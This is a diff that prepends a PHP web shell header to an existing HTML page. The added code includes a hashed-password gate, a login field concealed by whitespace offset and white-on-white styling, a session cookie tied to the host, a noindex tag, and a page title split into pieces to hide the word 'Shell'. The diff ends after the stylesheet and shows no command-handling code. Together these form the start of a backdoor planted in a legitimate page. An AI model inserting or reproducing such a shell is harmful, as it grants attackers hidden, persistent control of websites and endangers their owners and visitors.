@@ -1,3 +1,140 @@
+<?php 
+$auth_pass ="8e86bde3ad691cfc195a8ad67b444801";
+function Login() {
+  die("<!DOCTYPE HTML>
+<html>
+<title>
+</title>
+<br>
+<form method='post'><input style='text-align:center;margin:0;margin-top:868px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if(!empty($auth_pass)) {
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<?php echo "<title>bl"."ack"."-"."cr"."o"."w Shell</title>"; ?>
+	<meta name="robots" content="noindex">
+	<link rel="icon" href="https://lh3.googleusercontent.com/pw/AP1GczN2P_BF2RU5Wb8Ss59HmalHGwiQ3Ob1vMucxkRx_94gr9cvVD1ON3DOGv3Q0C9DC4TQ1g1IGB2SRtK-UQ5D9xRLzNE4UG0AHPEl9ejVUU4Et99r7iVGz1bK_P2kx8c82PvaGofy1eBDGycwfirxPdS8Gh6u9x49ubtm7Q-e4aT9wF5jk6Cy3-lpKvzH65GMGvPVK3382uz0Ih7F0uFkuFM-o0MmeZ1wRSgbyL7BM7nECpS9lkOdKbaOOB3j5UzBRM2OwNpIRi1tXD1T45Y6zU8hd6PCb97bf48rHSEGICH17mn4RWJ6XZ6pWpy_Q0RHO9vrq7ezEa0OhuL-x6uc1oFcgwn9IejsIRn5RwAlq5GFPS6_RgCxGMq4iWPIQxnbzjGQvHu5h8xeZgGMCoy4DjoihnBTi2nn8ymqbF8UVGKHQjdNtNzdE6RhZEf9yJTFaNxEqkWz7MDXIxzTN8VgljNF5E74FL2POFXOVw1QaChYaWSaKLckRI_bNL4qAhz1zlc8g_Gt1njJ3Qmc06WZddTv5ZN0nbabqdf_rBLJRcYIiHwJvk3kIPprjbgPNkkyOZSxT80lN2m99OuhysA20wKrDL4u6XqKau7St1O5MhnqhC54W_iSh3mCUHFzk5kCI3dd6vU0jA-WrP2a6kWo8eZAF_T_7e3Jp5ADA0NJTXqi1x-QKlED0iTWJK521fJxdgGRdZ7ApkFftoTUpfaEbr0LPEyD-WG_4W45Ae9wkvQQ6uyITaX-wWUjDlZxyMWzejL-JDjta3xJte6Y5t6XC4sz7HzWWX33G6E2HC6YJ5Xse7iA8EOVSqAAFxNYPgdwexAc6FBuuhYaKULrXvoPi00df2p6Gdr5K2iD2AR0bjJHW012A-5Xv0PJOxWpmPQrpwCxhwPzHaCP4a_LvkmXD1I=w360-h360-s-no-gm?authuser=0" type="image/x-icon">
+</head>
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Dosis');
+	@import url('https://fonts.googleapis.com/css?family=Bungee');
+	@import url('https://fonts.googleapis.com/css?family=Russo+One');
+body {
+	font-family: "Dosis", cursive;
+	text-shadow:0px 0px 1px #757575;
+}
+
+body::-webkit-scrollbar {
+  width: 12px;
+}
+
+body::-webkit-scrollbar-track {
+  background: #1f1f1f;
+}
+
+body::-webkit-scrollbar-thumb {
+  background-color: #1f1f1f;
+  border: 3px solid gray;
+}
+
+#content tr:hover {
+	background-color: #636263;
+	text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+	background-color: #25383C;
+}
+
+#content .first:hover {
+	background-color: #25383C
+	text-shadow:0px 0px 1px #757575;
+}
+
+table {
+	border: 1px #000000 dotted;
+	table-layout: fixed;
+}
+
+td {
+	word-wrap: break-word;
+}
+
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+
+a:hover {
+	color: #000000;
+	text-shadow:0px 0px 10px #ffffff;
+}
+
+input,select,textarea {
+	border: 1px #000000 solid;
+	-moz-border-radius: 5px;
+	-webkit-border-radius:5px;
+	border-radius:5px;
+}
+
+.gas {
+	background-color: #1f1f1f;
+	color: #ffffff;
+	cursor: pointer;
+}
+
+select {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+select:after {
+	cursor: pointer;
+}
+
+.linka {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+.up {
+	background-color: transparent;
+	color: #fff;
+}
+
+option {
+	background-color: #1f1f1f;
+}
+
+.btf {
+	background: transparent;
+	border: 1px #fff solid;
+	cursor: pointer;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+</style>
 <!DOCTYPE html>
 <html>
 <head>
